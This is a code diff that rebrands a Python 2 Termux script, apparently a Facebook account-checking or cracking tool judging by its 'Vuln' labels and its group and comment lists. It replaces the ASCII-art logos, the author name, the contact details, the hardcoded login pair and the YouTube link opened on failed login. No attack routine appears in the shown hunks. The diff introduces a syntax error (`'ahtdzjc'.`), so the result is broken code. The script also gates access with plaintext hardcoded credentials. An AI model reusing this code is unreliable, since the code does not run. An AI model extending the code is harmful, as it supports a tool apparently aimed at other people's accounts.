@@ -23,7 +23,7 @@ def keluar():
 	os.sys.exit()
 
 def acak(b):
-    w = 'ahtdzjc'
+    w = 'ahtdzjc'.
     d = ''
     for i in x:
         d += '!'+w[random.randint(0,len(w)-1)]+i
@@ -59,27 +59,27 @@ Y='\033[1;93m'
 ##### LOGO #####
 logo = """
 \033[1;96m
-░░░░░██╗░█████╗░███╗░░░███╗
-░░░░░██║██╔══██╗████╗░████║
-░░░░░██║███████║██╔████╔██║
-██╗░░██║██╔══██║██║╚██╔╝██║
-╚█████╔╝██║░░██║██║░╚═╝░██║
-░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
-\033[1;93m\033[1;92m\033[1;93m WhatsApp Num \033[1;94m\033[1;95m\033[1;93m  \033[1;96m\033[1;93m +971528752764 \033[1;92m\033[1;95m
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+██████╗░░█████╗░██╗░░██╗██╗██████╗░
+██╔══██╗██╔══██╗██║░██╔╝██║██╔══██╗
+██████╔╝███████║█████═╝░██║██████╦╝
+██╔══██╗██╔══██║██╔═██╗░██║██╔══██╗
+██║░░██║██║░░██║██║░╚██╗██║██████╦╝
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
+\033[1;93m\033[1;92m\033[1;93m \033[1;94m\033[1;95m\033[1;93m  \033[1;96m\033[1;93m \033[1;92m\033[1;95m
+\033[1;95m«-----------------\033[1;91mMr-RAKIB\033[1;95m-----------------»"""
 logo2 = """
 \033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇▇▇\033[1;91m▇▇▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇
-\033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇ J\033[1;91m J ▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇
-\033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇ A\033[1;91m A ▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇
-\033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇ M\033[1;91m M ▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇
-\033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇ J\033[1;91m J ▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇
-\033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇ A\033[1;91m A ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
-\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇ M\033[1;91m M ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
-\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇▇▇\033[1;91m▇▇▇▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
-\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  +971528752764 ▇▇
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇  \033[1;91m  ▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇
+\033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇ \033[1;91m   ▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇
+\033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇ \033[1;91m   ▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇
+\033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇ \033[1;91m   ▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇
+\033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇ \033[1;91m   ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
+\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇ \033[1;91m   ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
+\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇▇▇\033[1;91m  ▇▇▇▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
+\033[1;93m▇▇ KHAN  BROTHER ▇▇\033[1;93m     ▇▇  KHAN  BROTHER  ▇▇
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo3 = """
-\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  +971528752764 ▇▇"
+\033[1;93m
 ___________________$$$$$$
 _______________$$$__$$_$$$
 _______________$____¶¶___$$§§
@@ -115,7 +115,7 @@ _______$$$$$$$$$$_$$$________________________$$$
 ____________________$$$$__________________$$$$
 ________________________$$$$$$$$$$$$$$$$$$$
  
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo4 = """
 \033[1;96m
 ____#
@@ -165,7 +165,7 @@ _____________§$____________#$$
 _______________#$$§#______$$$
 _________________§$§#$$$$##
  
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo5 = """
 \033[1;91m•____________¶¶¶1¶¶_________¶¶¶¶¶¶¶___________ 
 _________¶¶¶111¶¶___________¶¶111¶¶¶¶________ 
@@ -185,7 +185,7 @@ ____¶¶¶¶____________¶¶¶¶¶¶___________¶¶¶¶____
 ______¶¶¶__________¶¶¶__¶¶¶__________¶¶______ 
 _______¶¶¶_________¶______¶_________¶¶¶______
  
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo6 = """
 \033[1;93m•_____________$$$$
 ____________$$$$$$$
@@ -211,7 +211,7 @@ _________$$_____$______$$$
 __________$$____ ______$$$
 ____________$$$___$$$$$
      
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo7 = """
 \033[1;92m•___________$_____$_____$
 _____$____$$_____$______$$____$
@@ -239,7 +239,7 @@ ___$$____$$___$$$$$$$___$$____$$
 ____$$____$____$$$$$____$____$$
 _____$_____$___________$_____$
 ______$____$___________$____$
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo8 = """
 \033[1;95m	
                      .ed$$$" ""$$$$$be.
@@ -274,74 +274,15 @@ logo8 = """
            $.d$$$*     JAM-SHAHRUKH           *  J$$$e*
             $$$$                            "$$$"
 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo9 = """
-\033[1;95m•	
-                      o
-                   ooo$
-                oo$$$$$                 $$
-               $$$$$$$$oo             o$$$
-           oo$$$$$$$$$$$$$$$$ooo    o$$$$$                               oooo
-        o$$$$$$$$$$$$$$$$$$$$$$$$$o$$$$"$$                           o$$$$$$$
-     o$$$$$$$$$o$$$$$$$$$$$$$$$$$$$$$$$ $$o                       o$$$$$$$$$$
-     o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" $$$                      o$$$$$$$$$$
-  o$$$$$$$$$$$$$o"$"$$$$$$$$$$$$$$$$$$  $$$                    o$$$$$$$$$"
-  $$$$$$$$$$$$$$$$$$o  o$$$$$$$$$$$$$$  "$$$                  $$$$$$$$"
- $$"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  $$$                 o$$$$$$"
-  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$oo$$o                 $$$$$$$
-  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                 $$$$$$"
-  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                 $$$$$$
-  "$$$$$$$$$o$$$$$$$$$$$$$$$$oo$$$$$$$$$$$$"                 $$$$$$
-   "$$$$$$$$$"$ $$$$$$$$$$$o$$"$$$$$$$$$$$$                  $$$$$$
-     "$$$$$$"   $ $  "$"   $"$$  $"$""$$$$$                  $$$$$$o
-       ""$"$$o  $$$        $o$$  "$$$o$$$$    oo             "$$$$$$
-           "o$ "$$" oo     $$$$   $$o$$$$ o$$$$$$$$ooo        $$$$$$o
-             $      oo     "$"  o$$$$$$$$$$$$$"&""$$$$$        $$$$$$$o
-         ooo "$o    $$o      o$$$$$$$$$$$$$""    $$$$$$         "$$$$$$$
-      o$$$$$$$$$$oo "" oooo$""$$$$$$$$$$""      $$$$$$$          "$$$$$$$o
-    o$$$$$$$$$$$$o$""$$"       $$$o            "$"$$"$"            $$$$$$$
-   o$$$$$$$$$$$$$$$ $$$      o$$" ""$o                              $$$$$$$
-   $$$$$$$$$$$$$$$$ $$$"$$$$"$""       "$                             $$$$$$
-  $$$$$$$$$$$$$$$$" "$$$$"              $                            $$$$$$
-  $$$$$$$$"$"   $               o$$$$$o  $                          $$$$$$$
- $$$$$$$$$$"  o$$oo   o""  oooo$$$$$$$$$o$                         $$$$$$$$
-o$$$$$$$$$"  o$$$$$$oo$o$$$$$$$$$$$$$$$$$$  oooooooooooo       ooo$$$$$$$$
-$$$$$$$$$$o  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"&"$$$$ooo$$$$$$$$$$$$"
-$$$$$$$$$$$  $$$$$$$$$$$$$$$$""$$$$$$$$$$$$$$$$"        ""&$$$$$$$$$$""
-$$$$$$$$$$$  "$$$$$$$$$$$$$$     "$$$$$$$$$$$$              "$$$""$"
-$$$$$$$$$$$  o$""$$$$$$$$$$        $$$$$$$$$$$                "o
- $$$$$$$" "o$"       "$$$$        o$$$$$$$$$$$                 "o
- "o"$"$"  $"           $$        $$$$$$$$$$$$$$$                $
-  "o   oo$"            $       o$$$$$$$$$$$$$$$$                $
-    "&""              $       $$$$$$$$$$$$$$$$$$                $            o
-                     o"      $""$$$$$$$$$$$$$$$ooooooo         $"     ooo$$$$$
-                    o"      o"         $     o$$$$$$$$$$$ooo   $   oo$$oo$oooo
-                  o"       o"          $oo$$$$$$$$$$$$$$$$$$$o$"   $$o$$$$oo$$
-                o$"      o$$          $$$$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$
-               o$ooooo $"$"          o$$$$$$$$$$$$$$$$$$$$$$$$$    "$$$$$$$$$$
-              $$$$$$$$$ o"           $$$$$$$$$$$$$$$$$$$$$$$$$$    o$$$$$$$$$$
-            o$$$$$$$$$$$"            $$$$$$$$$$$$$$$$$$$$$$$$$"  $$$$$$$$$$$$$
-           o$$$$$$$$$$$"             $$$$$$$$$$$$$$$$$$$$$$$$$o$$$$$$$$$$$$$$$
-          $$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-          $$$$$$$$$$$                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-         $$$$$$$$$$"                 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
-        $$$$$$$$$$                    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
-      o$$$$$$$$$$                     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
- ooo$$$$$$$$$$$"                      $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
- o$$$$$$$$$$$$$$""                    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$""
- o$$$$$$$$$$$$$$                      $$$$$$$$$$$$$$$$$$$$$$$$$$$$"
- $$$$$$$$$$$$$"                        $$$$$$$$$$$$$$$$$$$$$$$$$$"
-  ""$$$$$$$"                           $$$$$$$$$$$$$$$$$$$$$$$$"
-                                       $$$$$$$$$$$$$$$$$$$$$$"
-                                       "$$$$$$$$$$$$$$$$$$$"
-                                        $$$$$$$$$$$$$$$$$"
-                                         "$$$$$$$$$$$$""
-                                           "$$$$$$$$"
+\033[1;95m	
+  KLOGO🔥                    
 
-                                             "JAM-SHAHRUKH"
+                                             "KHAN-BROTHER"
                                                
  
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo10 = """
 \033[1;93m
                         z$b
@@ -356,7 +297,7 @@ logo10 = """
                         $P*$
                        4P  *r
                        4    %
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo11 = """
 \033[1;96m                                             
         _______           
@@ -377,9 +318,9 @@ YOOo      OOO      oOOP
    `OOOOOI```IOOOOO'
     `OOOOI,,,IOOOO'
      `OOOOOOOOOOO'
-       `~OOOOO~'   JAM-SHAHRUKH
+       `~OOOOO~'   KHAN-BROTHER 
 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo12 = """
 \033[1;91m•~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿
 ░╦░╔╗╗╗╦═╗░░╔╗╔╦╗╦╔░╔═╗╔╗░ ░╗╗╗╔╔╗╔╗░
@@ -389,7 +330,7 @@ logo12 = """
  
 \033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
 logo13 = """
-\033[1;95m•JAM-SHAHRUKH	
+\033[1;95m•KHAN-BROTHER 	
                       :::!~!!!!!:.
                   .xUHWH!! !!?M88WHX:.
                 .X*#M@$!!  !X!M$$$$$$WWx:.
@@ -399,10 +340,10 @@ logo13 = """
              ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
                !:~~~ .:!M"T#$$$$WX??#MRRMMM!
                ~?WuxiW*`   `"#$$$$8!!!!??!!!
-             :X- M$$$$ \033[1;93mJAM \033[1;95m`"T#$T~!8$WUXU~
+             :X- M$$$$ \033[1;93mKHAN \033[1;95m`"T#$T~!8$WUXU~
             :%`  ~#$$$m:        ~!~ ?$$$$$$
           :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
-.....   -~~:<` !    ~?T#$$@@W@*?$$ \033[1;93mSHAHRUKH \033[1;95m/`
+.....   -~~:<` !    ~?T#$$@@W@*?$$ \033[1;93mBROTHER \033[1;95m/`
 W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 #"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
 :::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
@@ -410,12 +351,12 @@ W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
 $R@i.~~ !     :   ~$$$$$B$$en:``     
 ?MXT@Wx.~    :     ~"##*$$$$M~      
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo14 = """
 \033[1;96m            ___           _,.---,---.,_
             |         ,;~'             '~;, 
             |       ,;                     ;,      
-   Frontal  |      ;                         ; ,--- JAM-SHAHRUKH TECHNICAL 
+   Frontal  |      ;                         ; ,--- THE-KHAN BROTHER  
     Bone    |     ,'                         /'
             |    ,;                        /' ;,
             |    ; ;      .           . <-'  ; |
@@ -435,7 +376,7 @@ Zygomatic  |      .~  (__,.--" .^. "--.,__)  ~.
               |         \   .       . <-x---- Mental Foramen
               |__         \.    ^    ./   
                             ^~~~^~~~^                                
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo15 = """
 \033[1;92m•                      _____ 
             ¸,.-~·*¨.::::::::::¨*·~-.,¸ 
@@ -462,7 +403,7 @@ logo15 = """
 :    :¯¯¯:     :  `·´¯¯`·. :  :  .·´.·´_.·´`·.': :   `·.: 
 |`·._`·..·´   ¸.·|`·.·´¯`·.·´|`·.|·´_____.·.(·'_.|   '.·'_
 `·.|.·´__.·´ .·´`·.|.·´`·.|·´`·.¸||______|/\||_'|/   |__|/ 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo16 = """
 \033[1;92m	
                             (
@@ -498,7 +439,7 @@ logo16 = """
        (: <     ):  --:   ^  \  )(   )\/:   /   /_/ ) :._) :
         \..)   (_..  ..  :    :  : .(   \..:..    ./__.  ./
                    ^    ^      \^ ^           ^\/^     ^
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo17 = """
 \033[1;91m                       uuuuuuuuuuuuuuuuuuuuu.
                    .u$$$$$$$$$$$$$$$$$$$$$$$$$$W.
@@ -547,7 +488,7 @@ $$         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                               $$$$$$$$$$$$$$$$$$$$$$!
                             $$$$$$$$$$$$$$$$$$$$$$$`
                              $$$$$$$$$$$$$$$$$$$$"
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo18 = """
 \033[1;93m                         __________
                       .~#########%%;~.
@@ -572,7 +513,7 @@ X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X
       ` ,                @#%,.@  @@                `
                           @@@  @@@  
 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo19 = """
 \033[1;91m•	
      .... NO! ...                  ... MNO! ...
@@ -599,70 +540,13 @@ logo19 = """
          ................................
 
                                     `    `             
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo20 = """
 \033[1;95m	
-             nHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHn.
-          .MS?MMMMMMMMMMMMMMMMMM?MM~MMMMMMMMMSHMMMMMMMM(?"~\
-          MMMMMH?MMMMMMMX*MM?MMX%MM/MMMMMM"HMMMMMMMMMMMMMMH
-         MMMMMMMMMMMMMMMMMX*MX*MMMX?MMMMM(M!XMMMMMMMMMMMMMMMX
-        XMC)?MMMMMMMMMMMMMMMhX?!?MMMMX#MM!MXMMMMMMMMMMMML   '~
-'\      MMMMMMMMMMMMMMMMMMMMMMMM!~`````-`~!?MMMM)MMMMMMMMx
-   `~""MMM)MMMMMMMMMMMMMMMHhHH!~           `#MM(MMMMMMMMMM>
-      HM!HMMMMMMMMMMMMMMMM*?)?`                `"MMMMMMMMMX       .
-     XM!MMMMMMMMMMMMMMMMMMM?~                     'MMMMMMMM:..xx!`
-     M!MMMMMMMMMMMMMMMMMXH!                        MMMMXMMP"`
-    \!MMMMMMMSMHHHMM?XMM?~    -:::xx..             M?XMM?".x(
-    MXMMMMMMMMMM!XHMMMM":       ... `"%x          XHHHMMM*"
-   \!MMMMMMMM?XMMMMMMX!'~L     '%%%+:.  `       ..MMMMM"
-   'HMMMMMM?HMMMMM*XM!    h     ~\).^\~     .%""`MM?"
-   'MMMMMMMMMMMMMXMMM!    -X               +%%!.MMMXk
-   ?MMMMMMMMMMMXMMMMM `.   ~               `""'XMMMMX
-   !MMMMMMMMMMMMMMMMMX.    '                  XMkMMX>
-   XMMMMMMMMMMMMMMM?MXXXx.-`                  XXMMM!
-   MMMMMMMMMMMMMMMMXMXXXXXXx.         ~~      MMMMM
-   XMMMMMMMMMMMM?MMXXXXXXXXX!`         '+^  .MMM!P
-   'MMM!MMMMMMMMMi?M!"`        `~%HHHHxx.  xMMMM"
-   :MMMMMMMMMMMMMMM"               `\XMM .MMMMM
-   XMMMMMMMMMX?MM!                   `( HMMMMM
-  XMMMM)MMM"   \~                     'MMMMM*
- 'MMMMfMMM"  \~                        XMMM*
-.MMMMMXMM"  ^                          `MMM
-XMMMM!MM"                               MM>
-HMMMMXM~                                MM>
-?MMMMM~                                 Xf%
- MMMMf                                  %% \
- 4MMM                                    %
-   `M                                     %
-     %                                    %
-     %                                     %
-     %                 !                   %
-      %                 !                   %
-      %                 %                   !?%.
-      %                  %                   X. %%.
-       %                  %                  X!    %%.
-       %                  %                  '!       %.
-        %                  %                  !!         %.
-        %                  %                  '!          `%
-         %                  %                  !>          /%
-         %                   %                 !!          % %
-          %                   %                 !          \%
-          %                   %                 !!          %
-           %                   %                '!         %~
-            %                   %                !!       %~
-            %%                  %                `!     %%
-            %%%                  %                %++4MMf
-             ?MMx                 %                %. MMX
-              *MMMx               %                 !\'MMM>
-               MMMMMHx    .....xxnH                  %HMMM>
-                MMMMMMMMMMMMMMMMMMM>                  MMMMX
-                'MMMMMMMMMMMMMMMMMMk                  'MMMM
-                 'MMMMMMMMMMMMMMMMMM                   MMMM>
-                  ?MMMMMMMMMMMMMMMMMM                  'MMMX
-                   MMMMMMMMMMMMMMMMMMM                  MMMM
-                   XMMMMM
+KLoGo🔥             
+	     
 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo21 = """	
 \033[1;92m
  #
@@ -670,8 +554,8 @@ logo21 = """
  ###
   ####
    #####
-   #######
-    #######
+   ####
+    ####
     ########
     ########
     #########
@@ -709,7 +593,7 @@ logo21 = """
                                   ###
                                   ##
                                   #
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo22 = """
 \033[1;95m
    _____           _   _           
@@ -720,37 +604,38 @@ logo22 = """
   \_____|\___/ \__,_| |_.__/ \__, |
                               __/ |
                              |___/ 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo23 = """
-\033[1;96m    JAM-SHAHRUKH  Report 
+\033[1;96m    KHAN-BROTHER  Report 
 \033[1;95m ____                       _
 \033[1;95m|  _ \ ___ _ __   ___  _ __| |_
 \033[1;95m| |_) / _ \ '_ \ / _ \| '__| __|
 \033[1;95m|  _ <  __/ |_) | (_) | |  | |_
 \033[1;95m|_| \_\___| .__/ \___/|_|   \__|
 \033[1;95m          |_|
-\033[1;96m    JAM-SHAHRUKH  Report 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;96m    KHAN-BROTHER  Report 
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo24 = """
-\033[1;96m JAM-SHAHRUKH  Information 
+\033[1;96m KHAN-BROTHER 
+ Information 
 \033[1;95m  ____       _        _ _
 \033[1;95m |  _ \  ___| |_ __ _(_) |
 \033[1;95m | | | |/ _ \ __/ _` | | |
 \033[1;95m | |_| |  __/ || (_| | | |
 \033[1;95m |____/ \___|\__\__,_|_|_|
 \033[1;95m 
-\033[1;96m JAM-SHAHRUKH  Information 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;96m KHAN-BROTHER  Information 
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo25 = """
-\033[1;95m JAM-SHAHRUKH  Login 
+\033[1;95m KHAN-BROTHER  Login 
 \033[1;93m  _             _
 \033[1;93m | | ___   __ _(_)_ __
 \033[1;93m | |/ _ \ / _` | | '_ \
 \033[1;93m | | (_) | (_| | | | | |
 \033[1;93m |_|\___/ \__, |_|_| |_|
 \033[1;93m          |___/
-\033[1;95m JAM-SHAHRUKH  Login 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m KHAN-BROTHER  Login 
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -777,20 +662,15 @@ reaksigrup = []
 komen = []
 komengrup = []
 listgrup = []
-vulnot = "\033[31mNot Vuln"
-vuln = "\033[32mVuln"
+vulnot = "\033[31mThik Hoicha"
+vuln = "\033[32mVhul Hoicha"
 
 os.system("clear")
 print  """
 \033[1;96m
-░░░░░██╗░█████╗░███╗░░░███╗
-░░░░░██║██╔══██╗████╗░████║
-░░░░░██║███████║██╔████╔██║
-██╗░░██║██╔══██║██║╚██╔╝██║
-╚█████╔╝██║░░██║██║░╚═╝░██║
-░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
+KHAN LoGo🔥
                                      
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ╭━━━━╮╱▔▔▔╲      ▇▇▇▇▇▇┳┻┳┻┳┻")
 jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┃╯╯╭━┫▏╰╰╰▕      ▇▇▇▇▇▇┻┳┻┳┻┳")
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ┃╯╯┃▔╰┓▔▂▔▕╮     ▇▇▇▇▇▇┳┻┳┻┳┻")
@@ -802,16 +682,16 @@ jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇       ┃┈▕╲▂╱┈╭�
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃'''┈┃┈┃┈'''   ▇▇▇▇▇▇┻┳┻┳┻┳")
 jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┏╯▔'''╰┓┣━┳┫     ▇▇▇▇▇▇┳┻┳┻┳┻")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-jalan("\033[1;93m▇▇\033[1;95m           WellCome to JAM-SHAHRUKH   \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;91m             👇Tool Using Tips👇      \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;92m            Tool Update After-Week    \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;92m        Termux Data Clear After-Week  \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;92m         WhatsApp  Num +971528752764  \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;95m        WellCome to KHAN-BROTHER      \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;91m            Tool Using Tips           \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;92m          Tool Update After Week      \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;92m       Termux Data Clear After Week   \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;92m        FACEBOOK  : Mr.KHANVAU420     \033[1;93m▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-print "\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"
+print "\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"
 
-CorrectUsername = "jam"
-CorrectPassword = "jam"
+CorrectUsername = "KHAN"
+CorrectPassword = "KHAN"
 
 loop = 'true'
 while (loop == 'true'):
@@ -819,15 +699,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:JAM_SHAHRUKH
+            print "Logged in successfully as " + username #🔰🔰🔰
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+            os.system('xdg-open https://m.youtube.com/channel/UCaDycv8l8cGtCzIYR8ukEvg')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+        os.system('xdg-open https://m.youtube.com/channel/UCaDycv8l8cGtCzIYR8ukEvg')
 
 ##### LICENSE #####
 #=================#
